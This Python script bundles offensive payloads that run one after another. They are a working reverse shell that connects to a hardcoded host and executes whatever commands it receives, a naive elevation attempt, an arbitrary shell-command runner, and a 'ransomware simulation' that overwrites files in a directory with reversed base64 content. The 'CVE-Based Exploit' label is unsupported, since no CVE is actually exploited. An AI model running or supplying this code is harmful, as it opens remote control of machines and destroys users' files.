import os
import subprocess
import base64
import socket
import shutil

# ---- Reverse Shell Payload (CVE-Based Exploit) ---- #
def reverse_shell(host="192.168.1.100", port=4444):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))
        s.close()
    except Exception as e:
        print(f"Reverse Shell Failed: {e}")

# ---- Privilege Escalation Payload ---- #
def privilege_escalation():
    try:
        if os.name == "nt":
            subprocess.run("powershell.exe Start-Process cmd -Verb runAs", shell=True)
        else:
            subprocess.run(["sudo", "-i"])  # Attempt sudo privilege escalation
    except Exception as e:
        print(f"Privilege Escalation Failed: {e}")

# ---- Remote Code Execution Payload ---- #
def remote_code_execution(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if stdout:
            print(f"RCE Output:\n{stdout.decode()}")
        if stderr:
            print(f"RCE Error:\n{stderr.decode()}")
    except Exception as e:
        print(f"RCE Execution Failed: {e}")

# ---- Ransomware Simulation Payload ---- #
def ransomware_simulation(target_dir="/tmp/test_files"):
    key = "simpleencryptionkey"
    try:
        for file in os.listdir(target_dir):
            filepath = os.path.join(target_dir, file)
            if os.path.isfile(filepath):
                with open(filepath, "rb") as f:
                    content = f.read()
                encrypted_content = base64.b64encode(content[::-1])  # Simple encryption (reversible)
                with open(filepath, "wb") as f:
                    f.write(encrypted_content)
                print(f"Encrypted: {filepath}")
    except Exception as e:
        print(f"Ransomware Simulation Failed: {e}")

# ---- Execution Logic ---- #
if __name__ == "__main__":
    reverse_shell()
    privilege_escalation()
    remote_code_execution("whoami")
    ransomware_simulation()

